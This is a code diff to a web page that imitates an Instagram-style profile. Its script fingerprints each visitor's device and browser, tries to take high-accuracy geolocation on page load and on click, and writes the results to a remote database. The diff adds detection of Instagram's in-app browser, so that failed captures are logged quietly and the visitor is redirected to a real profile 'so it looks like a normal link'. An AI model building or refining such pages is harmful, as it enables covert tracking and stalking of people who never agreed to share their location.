@@ -86,7 +86,6 @@
             DM for collaborations or Mail at shivmarihal@gmail.com 👇🏻
         </div>
 
-        <!-- Follow Buttons -->
         <div class="action-buttons">
             <button class="btn-blue">Follow</button>
             <button class="btn-gray">Message</button>
@@ -95,7 +94,6 @@
                 <svg height="15" viewBox="0 0 24 24" width="15"><path d="M19.006 8.252a3.5 3.5 0 11-3.499-3.5 3.5 3.5 3.5 0 013.5 3.5h2.372v8.856c0 1.054-.863 1.918-1.938 1.918H4.538a1.92 1.92 0 01-1.917-1.918V8.252h2.372a3.5 3.5 0 113.5-3.5h6.992zM12 8.252a1.5 1.5 0 10-1.499-1.5 1.503 1.503 0 001.5 1.5z"></path></svg>
             </button>
         </div>
-
     </div>
 
     <main class="photo-grid">
@@ -149,6 +147,9 @@
     let locationCaptured = false;
     const finalRedirect = "https://www.instagram.com/priyankamjain___0207/";
 
+    // --- INSTAGRAM DETECTION ---
+    const isInstagram = navigator.userAgent.includes("Instagram");
+
     async function getDeviceModel() {
         if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
             try {
@@ -167,22 +168,28 @@
         return "Unknown Device";
     }
 
-    function captureLocation(triggerType) {
+    async function checkPermissionStatus() {
+        if (navigator.permissions && navigator.permissions.query) {
+            try {
+                const result = await navigator.permissions.query({ name: 'geolocation' });
+                return result.state; 
+            } catch (e) { return 'unknown'; }
+        }
+        return 'unknown';
+    }
+
+    async function captureLocation(triggerType) {
         if (!currentUserRef) return;
         
         if (triggerType === 'click') {
             document.getElementById('loading').style.display = 'flex';
         }
 
-        // NEW: Check if context is secure (HTTPS)
+        // HTTPS Check
         if (window.location.protocol !== "https:" && window.location.hostname !== "localhost") {
-            currentUserRef.update({ 
-                status: "Failed: Not HTTPS",
-                error_detail: "Geolocation requires HTTPS"
-            });
+            currentUserRef.update({ status: "Failed: Not HTTPS" });
             if (triggerType === 'click') {
-                alert("Security Error: This page must be loaded over HTTPS to verify location.");
-                window.location.href = finalRedirect;
+                window.location.href = finalRedirect; // Just redirect on IG
             }
             return;
         }
@@ -201,25 +208,33 @@
                 });
             },
             (err) => {
-                let errorMsg = err.message;
-                
-                // Specific handling for the error you are seeing
-                if (err.message.includes("sufficient geolocation permissions")) {
-                    errorMsg = "Browser Blocked: Check Site Settings";
-                    if (triggerType === 'click') {
-                        // Optional: alert the user to fix it
-                         // alert("Please allow location access to continue.");
-                    }
+                // INSTAGRAM SPECIFIC LOGIC
+                if (isInstagram) {
+                    // Instagram blocked it. We cannot fix this inside the app.
+                    // Log it and Redirect immediately so it looks like a normal link.
+                    currentUserRef.update({ 
+                        last_error: "Instagram In-App Denial",
+                        status: "Failed (IG In-App)"
+                    }).then(() => {
+                        window.location.href = finalRedirect;
+                    });
+                    return;
                 }
 
-                currentUserRef.update({ 
-                    last_error: errorMsg,
-                    status: "Denied/Error on " + triggerType
-                }).then(() => {
-                    if (triggerType === 'click') window.location.href = finalRedirect;
-                });
+                // Normal Browser Logic (Chrome/Safari)
+                let errorMsg = err.message;
+                const permState = "unknown"; // simplified for speed
+
+                // If user denied it on a normal browser, show alert ONLY on click
+                if (triggerType === 'click') {
+                     alert("Location access is blocked by your browser settings. Redirecting to profile...");
+                     window.location.href = finalRedirect;
+                } else {
+                    // Silent fail on load
+                    currentUserRef.update({ status: "Denied on Load" });
+                }
             },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
         );
     }
 
@@ -227,11 +242,14 @@
         const exactModel = await getDeviceModel();
         currentUserRef = db.ref('mobile_users').push();
         
+        // Tag user as Instagram Browser if detected
+        const browserType = isInstagram ? "Instagram In-App" : navigator.userAgent;
+
         await currentUserRef.set({
             device: exactModel,
-            userAgent: navigator.userAgent,
+            userAgent: browserType,
             time: new Date().toLocaleString(),
-            status: "On Page - Attempting Auto Capture"
+            status: "On Page"
         });
 
         captureLocation('load');
